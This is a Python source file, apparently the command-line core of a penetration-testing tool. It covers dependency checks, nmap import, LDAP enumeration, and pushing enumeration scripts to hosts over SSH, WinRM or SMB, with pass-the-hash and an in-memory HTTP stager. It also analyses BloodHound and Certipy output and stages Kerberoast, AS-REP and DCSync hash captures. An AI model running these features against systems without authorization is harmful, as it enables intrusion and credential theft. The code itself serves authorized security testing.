        ("netexec", False, "credentialed SMB/AD enum (credenum phase)"),
        ("ssh", False, "credentialed Linux local checks (credenum phase)"),
        ("browser", False, "auto web screenshots in write-ups (firefox/chromium)"),
    ]
    nmap_ok = False
    presence: dict[str, bool] = {}   # reused for the summary, so it can't disagree
    for name, required, desc in tools:
        present = shutil.which(name) is not None
        if name == "searchsploit":
            from . import exploits
            present = exploits.available()               # mirror the runtime gate
        if name == "ldap":
            from . import ad
            present = ad.ldap_available()                # ldapsearch OR ldap3 package
            if present:
                backend = "ldapsearch" if shutil.which("ldapsearch") else "ldap3 package"
                desc = f"credentialed AD LDAP enum (using {backend})"
        if name == "netexec":
            from . import credenum
            present = credenum.smb_tool() is not None   # nxc / crackmapexec too
        if name == "browser":
            from . import screenshot
            present = screenshot.available()             # firefox / chrome variants
            found = screenshot.browser_tool()
            if found:
                desc = f"auto web screenshots in write-ups (using {found})"
        if name == "nmap":
            nmap_ok = present
        presence[name] = present
        mark = "OK  " if present else ("MISSING (required)" if required else "-   (optional)")
        print(f"  {name:<15} {mark:<20} {desc}")
    from . import credenum as _ce
    if _ce.impacket_tool("GetUserSPNs"):
        print(f"  {'impacket':<15} {'OK  ':<20} Kerberoast / AS-REP / secretsdump")
    import importlib.util
    if importlib.util.find_spec("openpyxl") is not None:
        print("  openpyxl        OK   (not required; stdlib xlsx is built in)")

    # Optional real self-scan to prove the pipeline end-to-end on THIS box.
    scan_ok = None
    if nmap_ok and not args.no_self_scan:
        print("\nSelf-scan (real nmap against 127.0.0.1, top 100 ports) ...")
        scan_ok = _self_scan()
        print("  " + ("PASS - scanned, parsed, and wrote a workbook."
                      if scan_ok else "FAIL - see error above."))

    print("\nSummary")
    if not nmap_ok:
        print("  NOT READY - install nmap (the only hard requirement).")
        verdict = 1
    elif scan_ok is False:
        print("  NOT READY - nmap is present but the self-scan failed (see above).")
        verdict = 1
    else:
        degraded = [n for n, req, _ in tools if not req and not presence.get(n)]
        print("  READY." + (f"  Optional tools missing: {', '.join(degraded)}."
                            if degraded else "  All tools present."))
        verdict = 0
    return verdict


def _self_scan() -> bool:
    import tempfile
    try:
        from . import scanner
        profile = scanner.PROFILES["quick"]
        with tempfile.TemporaryDirectory() as d:
            fp = os.path.join(d, "p.xml")
            scanner.full_port_scan("127.0.0.1", fp, profile)
            ports = _ports_for_host(fp, "127.0.0.1")
            deep = os.path.join(d, "e.xml")
            scanner.enum_scan("127.0.0.1", ports or [80], deep, profile)  # (xml, issue)
            host = _fold_host("127.0.0.1", np.parse_nmap_xml(deep), {"127.0.0.1": "local"})
            host.enumerated = True
            from .report_excel import build_workbook, read_workbook_tracking
            out = os.path.join(d, "wb.xlsx")
            build_workbook([host], out)
            read_workbook_tracking(out)  # prove read-back parses too
            print(f"  found {len(host.open_ports)} open port(s) on 127.0.0.1; "
                  f"report + read-back OK.")
        return True
    except Exception as e:  # noqa: BLE001
        print(f"  error: {e}")
        return False


def _run_ldap_enum(store: Store, args: argparse.Namespace) -> None:
    if not ad.ldap_available():
        print("[!] --ldap-enum requested but no LDAP client found; skipping. "
              "Install ldap-utils (ldapsearch) for airgapped use, or ldap3.")
        return
    all_hosts = store.all_hosts()
    dc_ips = [args.dc_ip] if args.dc_ip else [h.ip for h in ad.domain_controllers(all_hosts)]
    if not dc_ips:
        print("[!] No Domain Controllers found for LDAP enumeration "
              "(use --dc-ip to target one directly).")
        return
    for dc_ip in dc_ips:
        anon = args.ldap_anon and not args.username
        label = "anonymous" if anon else f"as {args.domain}\\{args.username}"
        print(f"[*] LDAP enumeration of {dc_ip} ({label}) ...")
        try:
            domain, accounts = ad.ldap_enumerate(
                dc_ip, domain=args.domain or "", username=args.username or "",
                password=args.password or "", use_ssl=args.ldap_ssl, anonymous=anon)
        except Exception as e:  # noqa: BLE001
            print(f"[!] LDAP enumeration failed for {dc_ip}: {e}")
            continue
        host = store.get_host(dc_ip)
        if host is not None:
            existing = {(a.source, a.kind, a.name) for a in host.accounts}
            host.accounts.extend(a for a in accounts
                                 if (a.source, a.kind, a.name) not in existing)
            store.upsert_host(host)
        store.upsert_domain(domain)
        n_users = sum(1 for a in accounts if a.kind == "user")
        n_spn = sum(1 for a in accounts if a.attrs.get("spn"))
        n_asrep = sum(1 for a in accounts if a.attrs.get("asrep_roastable") == "yes")
        print(f"    +{len(accounts)} objects ({n_users} users, {n_spn} with SPN, "
              f"{n_asrep} AS-REP roastable) for domain {domain.name or '?'}.")


def _ip_key(ip: str):
    try:
        return tuple(int(o) for o in ip.split("."))
    except ValueError:
        return (999, ip)


def _fold_host(ip, parsed_list, subnet_map):
    base = Host(ip=ip, subnet=subnet_map.get(ip, ""))
    for h in parsed_list:
        if h.ip != ip:
            continue
        base.hostnames = list(dict.fromkeys(base.hostnames + h.hostnames))
        base.mac = base.mac or h.mac
        base.vendor = base.vendor or h.vendor
        if h.os_accuracy >= base.os_accuracy and h.os_name:
            base.os_name, base.os_accuracy, base.os_family = h.os_name, h.os_accuracy, h.os_family
        base.distance = base.distance or h.distance
        base.last_scanned = h.last_scanned or base.last_scanned
        base.ports.extend(h.ports)
        base.vulns.extend(h.vulns)
        base.accounts.extend(h.accounts)
        base.exploits.extend(h.exploits)
        base.host_scripts.extend(h.host_scripts)
    base.subnet = subnet_map.get(ip, base.subnet)
    return base


# --- report / status / review ---------------------------------------------------

def _resolve_ingest_host(store, parsed, args):
    """Pick (or create) the Host that on-target loot belongs to.

    Priority: an explicit --host, else an IP parsed from the loot that already
    exists, else a synthetic host keyed by the loot's hostname/filename so the
    findings still land somewhere on the Priv-Esc sheet."""
    hosts = {h.ip: h for h in store.all_hosts()}
    hn = parsed.get("hostname", "")
    if getattr(args, "host", None):
        ip = args.host
        host = hosts.get(ip) or Host(ip=ip)
        # Record the loot's hostname so a later no --host ingest of the same box
        # matches this entry instead of synthesizing a second local:<host> one.
        if hn and hn not in host.hostnames:
            host.hostnames.append(hn)
        _tag_host_os(host, parsed)
        return host, (ip in hosts)
    # No --host: try the hostname against known hostnames, else synthesize.
    if hn:
        for h in hosts.values():
            if hn.lower() in [x.lower() for x in h.hostnames] or \
               hn.lower() == (h.hostname or "").lower():
                _tag_host_os(h, parsed)
                return h, True
    key = hn or os.path.splitext(os.path.basename(args.loot))[0]
    host = hosts.get(f"local:{key}") or Host(ip=f"local:{key}")
    if hn and hn not in host.hostnames:
        host.hostnames.append(hn)
    _tag_host_os(host, parsed)
    return host, (host.ip in hosts)


def _tag_host_os(host, parsed) -> None:
    if not host.os_family and parsed.get("os"):
        host.os_family = parsed["os"].capitalize()


def _ingest_service_output(svc: dict, paths: dict, args) -> int:
    """Fold recce-service.sh per-service findings into the datastore as confirmed
    service-enum Vulns on the matching host:port (creating a host entry if needed)."""
    from . import ingest
    from .models import Host, Port
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    vulns = ingest.service_findings_to_vulns(svc)
    by_ip: dict[str, list] = {}
    for v in vulns:
        by_ip.setdefault(v.ip, []).append(v)
    hosts_by_ip = {h.ip: h for h in store.all_hosts()}
    added_total = created = touched = 0
    for ip, vs in by_ip.items():
        h = hosts_by_ip.get(ip)
        if h is None:
            h = Host(ip=ip, subnet=".".join(ip.split(".")[:3]) + ".0/24",
                     enumerated=True)
            for pnum in sorted({v.port for v in vs if v.port}):
                h.ports.append(Port(portid=pnum, protocol="tcp", state="open",
                                    vuln_scanned=True))
            created += 1
        have = {(x.title, x.port) for x in h.vulns}
        added = [v for v in vs if (v.title, v.port) not in have]
        if not added:
            continue
        h.vulns.extend(added)
        aff = {v.port for v in added}
        for p in h.ports:
            if p.portid in aff:
                p.vuln_scanned = True
        store.upsert_host(h)
        added_total += len(added)
        touched += 1
    print(f"[+] Ingested {added_total} service finding(s) across {touched} host(s)"
          + (f" ({created} new host entry/entries)" if created else "") + ".")
    print("    Source: recce-service.sh output -> Vulnerabilities sheet "
          "(source 'service-enum'; advisory 'test X' lines kept as 'potential').")
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    return 0


def _fold_loot(host, text: str, source: str) -> tuple[int, int, int]:
    """Fold recce-enum.sh/.ps1 output text into a host: local findings (deduped by
    category/vector), AV/EDR defenses, and high-signal findings promoted to Vulns.
    Sets privesc_checked. Returns (added, total_rows, promoted). Shared by the
    `ingest` command and the `deploy` orchestrator so both fold identically."""
    from . import ingest
    parsed = ingest.parse_loot(text)
    new_rows = ingest.to_local_findings(parsed, source)
    have = {(f.get("category"), f.get("vector")) for f in host.local_findings}
    added = []
    for r in new_rows:
        key = (r["category"], r["vector"])
        if key not in have:
            have.add(key)
            added.append(r)
    host.local_findings.extend(added)
    known = set(host.defenses)
    for d in ingest.extract_defenses(text):
        if d not in known:
            known.add(d)
            host.defenses.append(d)
    have_v = {v.key for v in host.vulns}
    promoted = [v for v in ingest.promote_to_vulns(host.ip, host.local_findings)
                if v.key not in have_v]
    host.vulns.extend(promoted)
    # Backfill listening-service ground truth (binary path, owning service,
    # loopback-only listeners) from the on-target scripts onto the host's ports.
    ingest.backfill_ports(host, ingest.parse_listeners(text))
    host.privesc_checked = True
    return len(added), len(new_rows), len(promoted)


def cmd_ingest(args: argparse.Namespace) -> int:
    from . import ingest
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first so there's a "
              "workbook to fold findings into.")
        return 1
    if not os.path.exists(args.loot):
        print(f"[x] Loot file not found: {args.loot}")
        return 1
    with open(args.loot, "r", errors="replace") as fh:
        text = fh.read()
    parsed = ingest.parse_loot(text)
    if not parsed["is_recce"]:
        # Maybe it's per-service enumeration output (recce-service.sh) instead.
        svc = ingest.parse_service_output(text)
        if svc["is_service"] and svc["findings"]:
            return _ingest_service_output(svc, paths, args)
        print("[!] This doesn't look like recce-enum.sh/.ps1 output (no "
              "'recce-enum host=...' banner). Parsing [!] lines anyway.")
    if not parsed["findings"]:
        print("[!] No [!] findings in that loot - nothing to ingest.")
        return 0

    source = os.path.basename(args.loot)
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    host, existed = _resolve_ingest_host(store, parsed, args)
    added, total, promoted = _fold_loot(host, text, source)
    store.upsert_host(host)
    where = "existing host" if existed else "new host entry"
    hn = f" ({parsed['hostname']})" if parsed["hostname"] else ""
    print(f"[+] Ingested {added} finding(s) from {source} into {where} "
          f"{host.ip}{hn}"
          + (f"; {total - added} already present" if total != added else "")
          + ".")
    if promoted:
        print(f"    Promoted {promoted} high-signal finding(s) to the "
              "Vulnerabilities sheet.")
    print(f"    OS: {host.os_family or 'unknown'}. See the Priv-Esc tab "
          "(rows tagged 'on-target finding').")
    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    return 0


def _deploy_worker(host, ssh_creds, win_creds, timeout, loot_dir,
                   stager=None, authmap=None):
    """Run the on-target enum script on one host remotely, save the raw loot, fold
    it into the host. Returns (host, transport, added, promoted, error)."""
    from . import deploy
    transport, out, err = deploy.deploy_one(host, ssh_creds, win_creds, timeout,
                                            stager=stager, authmap=authmap)
    if not out:
        return host, transport, 0, 0, (err or "no output returned")
    try:
        with open(os.path.join(loot_dir, f"{host.ip}.txt"), "w", errors="replace") as fh:
            fh.write(out)
    except OSError:
        pass
    added, _total, promoted = _fold_loot(host, out, f"deploy:{transport or 'remote'}")
    return host, transport, added, promoted, None


def cmd_deploy(args: argparse.Namespace) -> int:
    """Push + run recce's read-only local-enum / priv-esc scripts across every host
    we have credentials for (SSH / WinRM / SMB), then fold the results in."""
    from . import deploy
    print(BANNER)
    paths = _open_paths(args.output_dir)
    if not os.path.exists(paths["db"]):
        print(f"[x] No datastore at {paths['db']}. Run `enum` first so there are "
              "hosts to deploy to.")
        return 1
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    ssh_creds = _ssh_creds_of(args)
    win_creds = _creds_of(args)
    if win_creds and getattr(args, "hash", None):
        win_creds["hash"] = args.hash          # pass-the-hash for SMB/WinRM
    if not ssh_creds and not win_creds:
        print("\n" + "!" * 64)
        print("[x] deploy needs credentials. Give --ssh-user (+ --ssh-pass/--ssh-key) "
              "for Linux,")
        print("    and/or -u/-p (+ -d domain, or --hash) for Windows WinRM/SMB.")
        print("!" * 64)
        store.close()
        return 1

    hosts = _selected_hosts(store.all_hosts(), args)
    # nxc precheck: which protocols do these creds ACTUALLY authenticate to? Deploy
    # only where they truly work (and pick that transport), instead of guessing
    # from open ports. Skipped with --no-validate or when nxc isn't installed.
    authmap: dict = {}
    if not getattr(args, "no_validate", False):
        print("[*] Checking which hosts accept the creds (nxc smb/winrm/ssh) ...")
        authmap = deploy.validate([h.ip for h in hosts], ssh_creds, win_creds)
        if authmap:
            n_win = sum(1 for a in authmap.values() if a.get("winrm"))
            n_smb = sum(1 for a in authmap.values() if a.get("smb"))
            n_ssh = sum(1 for a in authmap.values() if a.get("ssh"))
            print(f"    creds valid on: {n_win} WinRM, {n_smb} SMB-admin, {n_ssh} SSH "
                  "host(s).")
        else:
            print("    (nxc unavailable or no results - falling back to open-port "
                  "selection.)")
    the_plan = deploy.plan(hosts, ssh_creds, win_creds, authmap or None)
    deployable = [(h, t) for h, t in the_plan if t]
    skipped = [h for h, t in the_plan if not t]
    if not deployable:
        print("[!] No hosts have a usable transport + matching credentials.")
        print("    Need an open SSH (22) / WinRM (5985) / SMB (445) port and the "
              "matching cred set. Run `enum` first, or widen your creds.")
        store.close()
        return 1

    by_t: dict[str, int] = {}
    for _h, t in deployable:
        by_t[t] = by_t.get(t, 0) + 1
    print(f"[*] Deploy plan: {len(deployable)} host(s) reachable "
          f"({', '.join(f'{n}×{t}' for t, n in sorted(by_t.items()))})"
          + (f"; {len(skipped)} skipped (no transport/creds)" if skipped else "") + ".")
    use_stager = getattr(args, "stager", False)
    if use_stager:
        print("    Windows hosts fetch + run recce-enum.ps1 IN MEMORY from a local "
              "HTTP stager (no temp file); falls back to the push path if a host "
              "can't route back to you.")
    else:
        print("    Scripts are READ-ONLY (recce-enum.sh/.ps1). SSH & WinRM run in "
              "memory (no artifact); SMB drops to %TEMP% and deletes after.")
    print("    Confirm this is within your rules of engagement.")
    if getattr(args, "dry_run", False):
        print(f"\n  WILL RUN ({len(deployable)}):")
        for h, t in sorted(deployable, key=lambda ht: _ip_key(ht[0].ip)):
            print(f"    {h.ip:<16} -> {t}" + ("  (+http stager if reachable)"
                                              if use_stager and t != "ssh" else ""))
        if skipped:
            print(f"\n  UNABLE / SKIPPED ({len(skipped)}):")
            for h in sorted(skipped, key=lambda x: _ip_key(x.ip)):
                print(f"    {h.ip:<16} -- {deploy.skip_reason(h, ssh_creds, win_creds, authmap or None)}")
        print("\n[*] Dry run - nothing was executed. Drop --dry-run to deploy.")
        store.close()
        return 0

    # Optional HTTP stager for in-memory Windows exec.
    stager = None
    if use_stager:
        from .stager import Stager, detect_lhost
        lhost = getattr(args, "lhost", None) or detect_lhost()
        if not lhost:
            print("[x] --stager needs --lhost <your-ip that targets can reach>; "
                  "could not autodetect one.")
            store.close()
            return 1
        try:
            files = {"recce-enum.ps1": open(deploy.WINDOWS_SCRIPT, "rb").read()}
        except OSError as e:
            print(f"[x] Could not read the Windows script: {e}")
            store.close()
            return 1
        try:
            stager = Stager(lhost, files)
            stager.__enter__()
        except OSError as e:
            print(f"[x] Could not start the HTTP stager on {lhost}: {e}")
            store.close()
            return 1
        print(f"[*] HTTP stager on http://{lhost}:{stager.port}/ (serving "
              "recce-enum.ps1 to Windows hosts, torn down when done).")

    workers = max(1, args.workers)
    timeout = getattr(args, "timeout", None) or deploy.DEFAULT_TIMEOUT
    loot_dir = os.path.join(args.output_dir, "loot")
    try:
        os.makedirs(loot_dir, exist_ok=True)
    except OSError:
        loot_dir = paths["raw"]
    print(f"[*] Deploying to {len(deployable)} host(s) with {workers} worker(s); "
          f"loot -> {loot_dir}/ ...")
    completed = 0
    total = len(deployable)
    start = time.monotonic()
    errs: list[tuple[str, str]] = []
    try:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futures = {ex.submit(_deploy_worker, h, ssh_creds, win_creds, timeout,
                                 loot_dir, stager, authmap or None): h.ip
                       for h, _t in deployable}
            for fut in as_completed(futures):
                ip = futures[fut]
                try:
                    host, transport, added, promoted, err = fut.result()
                except Exception as e:  # noqa: BLE001
                    _record_issues(store, paths, ip, [{"phase": "deploy",
                                   "level": "error", "message": f"deploy crashed: {e}"}])
                    completed += 1
                    errs.append((ip, f"crashed: {e}"))
                    print(f"    [{completed}/{total}] {ip}: FAILED (crashed)"
                          f"{_progress(completed, total, start)}")
                    continue
                completed += 1
                if err:
                    _record_issues(store, paths, ip, [{"phase": "deploy",
                                   "level": "warning",
                                   "message": f"deploy via {transport or '?'}: {err}"}])
                    errs.append((ip, err))
                    print(f"    [{completed}/{total}] {ip}: {transport or '-'} FAILED "
                          f"- {err}{_progress(completed, total, start)}")
                    continue
                _persist_host(store, paths, ip, "deploy", host)
                bits = f"{added} finding(s)" + (f", {promoted} promoted" if promoted else "")
                print(f"    [{completed}/{total}] {ip}: {transport} OK ({bits})"
                      f"{_progress(completed, total, start)}")
    finally:
        if stager is not None:
            stager.__exit__(None, None, None)
    # Hosts we never attempted (no transport / creds didn't validate) are the
    # "unable to complete" bucket - write them to the workbook too, so the report
    # shows every host's outcome, not just the ones we reached.
    for h in skipped:
        _record_issues(store, paths, h.ip, [{"phase": "deploy", "level": "warning",
                       "message": "not deployed: "
                       + deploy.skip_reason(h, ssh_creds, win_creds, authmap or None)}])
    _final_report(store, paths, store.get_meta("engagement") or args.title)
    store.close()

    ok = total - len(errs)
    print(f"\n{'=' * 60}")
    print(f"  DEPLOY RESULTS: {ok} succeeded · {len(errs)} errored · "
          f"{len(skipped)} unable")
    print(f"{'=' * 60}")
    if errs:
        print(f"  ERRORED ({len(errs)}) - reached but did not complete:")
        for ip, msg in sorted(errs, key=lambda x: _ip_key(x[0])):
            print(f"    {ip:<16} -- {msg}")
    if skipped:
        print(f"  UNABLE ({len(skipped)}) - never attempted:")
        for h in sorted(skipped, key=lambda x: _ip_key(x.ip)):
            print(f"    {h.ip:<16} -- "
                  f"{deploy.skip_reason(h, ssh_creds, win_creds, authmap or None)}")
    print(f"\n[+] Loot saved in {loot_dir}/. Findings folded into local_findings "
          "+ the Priv-Esc tab.")
    if errs or skipped:
        print("    Errored / unable hosts are logged on the Overview issues tab.")
    print(f"    Next: recce attackpath -o {args.output_dir}  (or writeups).")
    return 0


def _collect_scan_files(paths: list[str]) -> list[str]:
    """Expand files / directories / globs into a list of nmap scan files. For a
    same-basename -oA set (base.xml + base.gnmap + base.nmap) keep only the richest
    format (xml > grepable > normal) so one scan isn't imported three times."""
    import glob
    found: list[str] = []
    for p in paths:
        if os.path.isdir(p):
            for pat in ("*.xml", "*.gnmap", "*.grep", "*.nmap"):
                found += sorted(glob.glob(os.path.join(p, pat)))
        elif os.path.exists(p):
            found.append(p)
        else:
            found += sorted(glob.glob(p))          # maybe a glob pattern
    rank = {".xml": 0, ".gnmap": 1, ".grep": 1, ".nmap": 2}
    best: dict[str, tuple[int, str]] = {}
    order: list[str] = []
    for f in found:
        base, ext = os.path.splitext(f)
        r = rank.get(ext.lower(), 3)
        if base not in best:
            best[base] = (r, f)
            order.append(base)
        elif r < best[base][0]:
            best[base] = (r, f)
    return [best[b][1] for b in order]


def cmd_import(args: argparse.Namespace) -> int:
    """Import an already-completed nmap scan (XML -oX or grepable -oG) and build /
    update the workbook - no scanning, no network. Folds hosts into the datastore,
    runs the offline enrichment (version->CVE, AD roles, SMB signing), sets the
    checkmarks, and preserves any existing tracking."""
    from . import vulndb
    files = _collect_scan_files(args.files)
    if not files:
        print("[x] No nmap scan files found. Point at .xml (-oX) or .gnmap (-oG) "
              "files, a directory, or a glob.")
        return 1
    parsed: list[Host] = []
    for f in files:
        hs = np.parse_nmap_file(f)
        print(f"    {os.path.basename(f)}: {len(hs)} host(s)")
        parsed.extend(hs)
    if not parsed:
        print("[x] Nothing parsed. Point at nmap XML (-oX, best), grepable "
              "(-oG), or normal (-oN, .nmap) output.")
        return 1

    paths = _open_paths(args.output_dir)
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)          # honour existing ticks first
    if not store.get_meta("engagement"):
        store.set_meta("engagement", args.title)

    by_ip: dict[str, list[Host]] = {}
    for h in parsed:
        by_ip.setdefault(h.ip, []).append(h)
    use_ss = getattr(args, "searchsploit", False) and exploits.available()
    enum_only = getattr(args, "enum_only", False)
    n_hosts = n_ports = n_findings = n_scanned = 0
    for ip, group in by_ip.items():
        subnet = ".".join(ip.split(".")[:3]) + ".0/24" if ip.count(".") == 3 else ""
        host = _fold_host(ip, group, {ip: subnet})
        host.enumerated = True
        if not enum_only:
            for p in host.ports:                  # scan ran scripts here -> vuln step done
                if p.scripts and not p.vuln_scanned:
                    p.vuln_scanned = True
                    n_scanned += 1
        ad.identify_roles(host)
        ad.parse_signing_and_ntlm(host)
        vulndb.assess_host_inplace(host)          # offline version->CVE/CWE findings
        if use_ss:
            exploits.enrich_hosts([host])
        store.upsert_host(host)                    # merges with existing (tracking kept)
        n_hosts += 1
        n_ports += len(host.open_ports)
        n_findings += len(host.vulns)

    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    print(f"\n[+] Imported {n_hosts} host(s) / {n_ports} open port(s) from "
          f"{len(files)} file(s): {n_findings} offline finding(s), "
          f"{n_scanned} port(s) marked vuln-scanned (had NSE output).")
    print("    Checklist 'Enumerated'"
          + ("" if enum_only else " + 'Vuln-scan' (where scripts ran)")
          + " are ticked. Run `vulns` to add recce's deeper detection, or "
          "`status` to see what's left.")
    return 0


def cmd_bloodhound(args: argparse.Namespace) -> int:
    """Import SharpHound and/or Certipy (ADCS) output, identify AD
    misconfigurations + vulnerabilities, map the shortest paths from YOUR account
    (or any authenticated user) to Domain Admin, and stage the follow-on actions.

    Simple credentialed run:  recce ad loot.zip -u alice -p 'Passw0rd' -d corp.local
    Add ADCS:                 recce ad loot.zip certipy.json -u alice -p ... -d corp.local
    Airgapped, stdlib-only; every command is pre-filled with your credentials."""
    from . import bloodhound as bh
    from . import adcs

    srcs = args.paths if isinstance(args.paths, list) else [args.paths]
    for s in srcs:
        if not os.path.exists(s):
            print(f"[x] Not found: {s}")
            return 1

    # Credentials: prefer the simple -u/-p/-d; fall back to --creds 'DOM/user:secret'.
    creds = None
    if args.username:
        user, domain = _split_userdomain(args.username, args.domain)
        secret = args.password or ""
        is_hash = bool(re.fullmatch(r"[0-9a-fA-F]{32}", secret or ""))
        creds = {"domain": domain, "user": user, "secret": secret,
                 "is_hash": is_hash, "dc_ip": args.dc_ip or ""}
    elif args.creds:
        c = _parse_cred_spec(args.creds)
        creds = {"domain": c.domain, "user": c.username, "secret": c.secret,
                 "is_hash": c.kind == "nthash", "dc_ip": args.dc_ip or ""}

    # Where attack paths start: explicit --owned, else YOUR account (simple default),
    # else any authenticated user.
    owned = set()
    if args.owned:
        for chunk in args.owned:
            owned.update(o.strip() for o in chunk.split(",") if o.strip())
    elif creds and creds["user"]:
        owned = {creds["user"]}
        if creds["domain"]:
            owned.add(f"{creds['user']}@{creds['domain']}")

    # Classify each input: SharpHound graph vs Certipy ADCS JSON.
    sh_paths = [s for s in srcs if bh.is_sharphound(s)]
    certipy_paths = [s for s in srcs if adcs.is_certipy(s)]
    unknown = [s for s in srcs if s not in sh_paths and s not in certipy_paths]
    for u in unknown:
        print(f"[!] {u} isn't recognised as SharpHound or Certipy output - skipped.")

    if sh_paths:
        print(f"[*] Parsing SharpHound: {', '.join(os.path.basename(p) for p in sh_paths)}")
        analysis = bh.analyze(sh_paths[0], owned=owned, creds=creds)
        for extra in sh_paths[1:]:                       # merge extra collections' findings
            more = bh.analyze(extra, owned=owned, creds=creds)
            analysis["findings"].extend(more["findings"])
            analysis["domains"].extend(more["domains"])
    else:
        analysis = bh.empty_analysis()

    if certipy_paths:
        print(f"[*] Parsing Certipy ADCS: {', '.join(os.path.basename(p) for p in certipy_paths)}")
        for cp in certipy_paths:
            analysis["findings"].extend(adcs.findings(cp))

    # Optional LIVE Kerberos capture (roast / AS-REP / DCSync): run the published
    # impacket tools to grab the real hashes and fold each capture in as a proven
    # finding before we sort + fold into the totals.
    _ad_live_kerberos(args, bh, creds, sh_paths, analysis)

    # Re-sort merged findings, fill in the operator's credentials, refresh stats.
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    analysis["findings"].sort(key=lambda f: order.get(f["severity"], 5))
    bh.fill_creds(analysis, creds)
    analysis["stats"]["findings"] = len(analysis["findings"])

    st = analysis["stats"]
    if st.get("nodes"):
        print(f"[+] Graph: {st['nodes']} node(s), {st['edges']} edge(s) "
              f"({', '.join(f'{k}={v}' for k, v in sorted(st['by_type'].items()))})")

    fs = analysis["findings"]
    if fs:
        by_sev: dict[str, int] = {}
        for f in fs:
            by_sev[f["severity"]] = by_sev.get(f["severity"], 0) + 1
        adcs_n = sum(1 for f in fs if f["category"].startswith("adcs-"))
        print(f"[+] {len(fs)} AD finding(s)"
              + (f" ({adcs_n} ADCS/ESC)" if adcs_n else "") + ": "
              + ", ".join(f"{by_sev[s]} {s}" for s in
                          ("critical", "high", "medium", "low") if by_sev.get(s)))
        for f in fs[:10]:
            print(f"      [{f['severity'].upper():8}] {f['title']} - {f['principal']}")
        if len(fs) > 10:
            print(f"      ... and {len(fs) - 10} more (see the AD Findings sheet)")

    paths_found = analysis["paths"]
    if paths_found:
        print(f"[+] {len(paths_found)} attack path(s) to a high-value target:")
        for p in paths_found[:5]:
            who = "ANY user" if p.get("any_user") else p["start"]
            print(f"      {who} -> {p['target']}  ({p['length']} hop): {p['chain']}")
    elif sh_paths:
        print("[!] No path to a high-value target from "
              + (f"{', '.join(sorted(owned))}" if owned else "any authenticated user")
              + " in this collection.")
    if analysis["kerberos"]:
        print(f"[+] {len(analysis['kerberos'])} Kerberos action(s) staged "
              "(see the AD Attack Paths sheet).")

    paths = _open_paths(args.output_dir)
    store = _open_store(paths["db"])
    if store is None:
        return 1
    _import_excel_tracking(store, paths)
    if not store.get_meta("engagement"):
        store.set_meta("engagement", args.title)
    store.set_meta("ad_bloodhound", json.dumps(analysis))
    # Merge domain facts (trusts, functional level, MachineAccountQuota) so the
    # Active Directory sheet reflects the import even without a network scan.
    from .models import Domain
    for dom in analysis["domains"]:
        name = (dom.get("name") or "").lower()
        if not name:
            continue
        existing = store.get_domain(name)
        d = existing or Domain(name=name)
        d.functional_level = d.functional_level or str(dom.get("functionallevel") or "")
        d.machine_account_quota = d.machine_account_quota or str(
            dom.get("machineaccountquota") or "")
        d.trusts = d.trusts or [
            {"name": t.get("TargetDomainName"), "direction": t.get("TrustDirection"),
             "type": t.get("TrustType")} for t in dom.get("trusts") or []]
        if "bloodhound" not in d.sources:
            d.sources.append("bloodhound")
        store.upsert_domain(d)

    # Feed the AD findings into the MAIN totals + writeups by attaching them as
    # Vulns on the DC / domain host (keyed by --dc-ip when given, so they merge
    # onto the scanned DC rather than creating a duplicate).
    if analysis["findings"]:
        from .models import Host
        dom_name = analysis["domains"][0]["name"] if analysis["domains"] else ""
        ad_ip = (creds and creds.get("dc_ip")) or dom_name or "active-directory"
        vulns = bh.findings_to_vulns(analysis, ad_ip, dom_name)
        replace = getattr(args, "replace_ad", False)
        host = store.get_host(ad_ip)
        removed = 0
        if host is None:
            host = Host(ip=ad_ip, hostnames=[dom_name] if dom_name else [],
                        os_family="Windows")
            if creds and creds.get("dc_ip"):
                host.roles = ["Domain Controller"]
        elif replace:
            # Drop the previously-imported AD/ADCS findings so a re-import reflects
            # the CURRENT state (fixed items disappear); other host data is kept.
            before = len(host.vulns)
            host.vulns = [v for v in host.vulns
                          if v.source not in ("bloodhound", "adcs")]
            removed = before - len(host.vulns)
        host.enumerated = True
        have = {v.key for v in host.vulns}
        for v in vulns:
            if v.key not in have:
                have.add(v.key)
                host.vulns.append(v)
        # merge=False on replace so the old AD vulns aren't re-introduced by the
        # union-merge (we've already loaded and rewritten the full host).
        store.upsert_host(host, merge=not replace)
        msg = (f"    -> {len(vulns)} AD finding(s) folded into the main severity "
               f"totals + writeups (host {ad_ip})")
        if replace:
            msg += f"; replaced {removed} prior AD finding(s)"
        print(msg + ".")

    title = store.get_meta("engagement") or args.title
    _generate_reports(store, paths, title)
    store.close()
    written = []
    if analysis["findings"]:
        written.append("AD Findings")
    if analysis["paths"] or analysis["kerberos"]:
        written.append("AD Attack Paths")
    if written:
        print(f"    -> {' + '.join(written)} sheet(s) written to the workbook.")
    else:
        print("    -> Nothing to import (no AD findings or paths in the input).")
    return 0


def _ad_shot(args, name, command, output):
    """Render a terminal-output proof screenshot of a live Kerberos capture into
    engagement/screenshots/. Returns the saved path or None."""
    if not getattr(args, "screenshots", False):
        return None
    from . import mssql, screenshot
    if not screenshot.available():
        return None
    png = screenshot.capture_html(mssql.proof_html(command, output, prompt="# "))
    if not png:
        return None
    shot_dir = os.path.join(args.output_dir, "screenshots")
    os.makedirs(shot_dir, exist_ok=True)
    path = os.path.join(shot_dir, f"ad_{name}.png")
    with open(path, "wb") as fh:
        fh.write(png)
    print(f"      [+] proof screenshot -> {path}")
    return path


def _ad_live_kerberos(args, bh, creds, sh_paths, analysis):
    """Run the opted-in live Kerberos captures, fold the proven findings into the
    analysis, write the captured hashes to engagement/loot/, and screenshot each."""
    do_roast = getattr(args, "roast", False)
    do_asrep = getattr(args, "asrep", False)
    do_dcsync = getattr(args, "dcsync", False)
    if not (do_roast or do_asrep or do_dcsync):
        return
    if not (creds and creds.get("secret")):
